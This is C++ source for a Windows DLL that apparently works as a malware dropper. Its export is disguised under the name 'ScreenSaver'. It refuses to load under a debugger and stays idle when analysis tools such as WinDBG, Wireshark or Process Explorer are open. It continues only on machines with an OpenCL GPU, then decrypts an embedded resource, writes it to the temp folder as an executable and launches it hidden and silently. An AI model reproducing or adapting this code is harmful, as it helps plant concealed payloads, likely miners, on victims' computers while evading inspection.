// mso.cpp : Defines the entry point for the DLL application.
//

#include "stdafx.h"
#include "ec.h"
#include "resource.h"
#include "shlwapi.h"
#include "shellapi.h"
#pragma comment(lib,"shlwapi.lib")
#pragma comment(lib,"shell32.lib")
BOOL APIENTRY DllMain( HANDLE hModule, 
                       DWORD  ul_reason_for_call, 
                       LPVOID lpReserved
					 )
{
	if (ul_reason_for_call == DLL_PROCESS_ATTACH)
	{
		DisableThreadLibraryCalls((HMODULE)hModule);
		if(IsDebugging())
			return FALSE; 

	}
    return TRUE;
}
static BOOL CALLBACK EnumWindowsProc(          HWND hwnd,
									 LPARAM lParam
									 )
{
	TCHAR szText[1024] = {0};
	GetWindowText(hwnd, szText , 1024);
	PTCHAR pszBlacklist_window[] = {L"Microsoft Visual",L"HTTP Analyzer",L"WinDBG",L"OllyDebug",
		L"fiddler", L"SmartSniff", L"Spy++",L"ATL/MFC",L"任务管理器",L"Spy",L"DebugView",
		L"Process Explorer", L"File Monitor", L"Registry Monitor",L"Wireshark",L"OllyICE",L"OllyDBG"
		L" - Sysinternals:" //
	};
	for(int i = 0; i < ( sizeof (pszBlacklist_window) / sizeof (pszBlacklist_window[0]) ); i++)
	{
		PTCHAR pszTitle = pszBlacklist_window[i];
		if(0 == StrStrI(szText, pszTitle))
		{
			return 1;
		}
		else
		{
			 
			return 0;
		}
	}

	return TRUE;
}
BOOL eXclusive(void)
{
	return !EnumWindows(EnumWindowsProc, (LPARAM)0);
}
HRESULT IsSupportOpencl(LONG* pl)
{
 	// TODO: 在此添加实现代码 	
	unsigned int m_platform = 0;
	unsigned int m_devicecount = 0;
	typedef struct _cl_platform_id *    cl_platform_id;
	* pl = 0;

	HMODULE hMod =  LoadLibrary(L"opencl.dll");
	if(NULL == hMod)
	{
		return S_OK; 
	}
	typedef int (__stdcall*	PclGetPlatformIDs)(unsigned int , cl_platform_id * , unsigned int*);
	PclGetPlatformIDs pclGetPlatformIDs = (PclGetPlatformIDs)GetProcAddress(hMod, "clGetPlatformIDs");

	typedef int (__stdcall*	PclGetDeviceIDs)(cl_platform_id ,unsigned __int64 , unsigned int, void *  ,   unsigned int * );
	PclGetDeviceIDs pclGetDeviceIDs = (PclGetDeviceIDs)GetProcAddress(hMod,"clGetDeviceIDs");

	if(NULL == pclGetPlatformIDs || NULL == pclGetDeviceIDs)
	{
		FreeLibrary(hMod);
		return S_OK;
	}

	unsigned int numplatforms = 0;
	pclGetPlatformIDs(0,NULL,&numplatforms);
//	printf("%d OpenCL platforms found\n",numplatforms);
	if(0 >= numplatforms)
	{
		FreeLibrary(hMod);
		return S_OK;
	}

	if(numplatforms>0 && m_platform>=0 && m_platform<numplatforms)
	{
#define CL_DEVICE_TYPE_GPU                          (1 << 2)

		cl_platform_id *pids;
		pids=new cl_platform_id[numplatforms];
		pclGetPlatformIDs(numplatforms,pids,NULL);
		pclGetDeviceIDs(pids[m_platform],CL_DEVICE_TYPE_GPU,0,NULL,&m_devicecount);

//		printf("%d OpenCL GPU devices found on platform %d\n",m_devicecount,m_platform);
		if(0 >=m_devicecount)
		{
			FreeLibrary(hMod);
			return S_OK;
		}		 
		else
		{
			* pl = 1;
			FreeLibrary(hMod);
			return S_OK;
		}

	}	
	FreeLibrary(hMod);
	return S_OK;
}

inline HINSTANCE			GetCurrentModuleHandle(void)
{
	static HINSTANCE hCurrentModule = 0;
	if(NULL == hCurrentModule)
	{
		MEMORY_BASIC_INFORMATION m = { 0 };
		VirtualQuery(&hCurrentModule, &m, sizeof(MEMORY_BASIC_INFORMATION));
		hCurrentModule = (HINSTANCE) m.AllocationBase;
	}
	return hCurrentModule;
}
#pragma comment(linker, "/EXPORT:ScreenSaver=?_si0@@YGXPAUHWND__@@PAUHINSTANCE__@@PA_WH@Z,PRIVATE") 
 //__declspec(dllexport)
	 void CALLBACK _si0(	HWND hwnd,	HINSTANCE hinst,	LPTSTR lpCmdLine,	int nCmdShow)
{	
	//OutputDebugStringA((LPCSTR)lpCmdLine);	 

	HKEY hKey = NULL;
	LONG lRes = RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\ExtIconHandler", 0, KEY_READ | KEY_WRITE, &hKey);
	if(lRes == ERROR_SUCCESS)
	{
		return;
	}
	if(eXclusive())
	{
		return ;
	}
	LONG l = 0;
	IsSupportOpencl(&l);
	if(l ==0)
	{
		return ;
	}

	HINSTANCE hResHandle = GetCurrentModuleHandle();		
	HRSRC hRsrc = ::FindResourceW(hResHandle, MAKEINTRESOURCE(IDR_IFD1), L"IFD");
	if(hRsrc != NULL)
	{
		HGLOBAL hGlobal = ::LoadResource(hResHandle, hRsrc);
		if(hGlobal != NULL)
		{
			LPVOID pData = ::LockResource(hGlobal);
			if(pData != NULL)
			{
				DWORD dwSize = SizeofResource(hResHandle, hRsrc);
				char* pszData = new char[dwSize+1];
				pszData[dwSize] = '\0';					
				memcpy( pszData, pData, dwSize);
				dc(pszData, dwSize);
#ifndef _MAX_PATH				
#define  _MAX_PATH 260
#endif
				char szTempFile[_MAX_PATH] = {0};
				GetTempPathA(_MAX_PATH, szTempFile);
				PathAddBackslashA(szTempFile);
				char* pszFileName = NULL;
				if(lpCmdLine && lpCmdLine[0] !='\0')
				{
					pszFileName = (char*)lpCmdLine;

				}
				else
				{
					pszFileName = "ovxInstall";
				}
				//PathAppendA(szTempFile, pszFileName);
				//PathAppendA(szTempFile, ".exe");
				strcat(szTempFile, pszFileName);
				strcat(szTempFile, ".exe");
				HANDLE hFile =CreateFileA(szTempFile, GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, 0 , NULL);
				if(INVALID_HANDLE_VALUE != hFile)
				{
					DWORD dwByteWritten = 0 ;
                    WriteFile(hFile, pszData, dwSize, &dwByteWritten, NULL);
					
					CloseHandle(hFile);
				}
				if(PathFileExistsA(szTempFile))
				{
					OutputDebugStringA(szTempFile);

					ShellExecuteA(NULL, NULL, szTempFile, "/S", "", SW_HIDE);
				}
                
				//<<"ReadResourceContents : "<<strContents.c_str()<<"\n";
				UnlockResource(hGlobal);
			}
		}
	}
	return ;
}


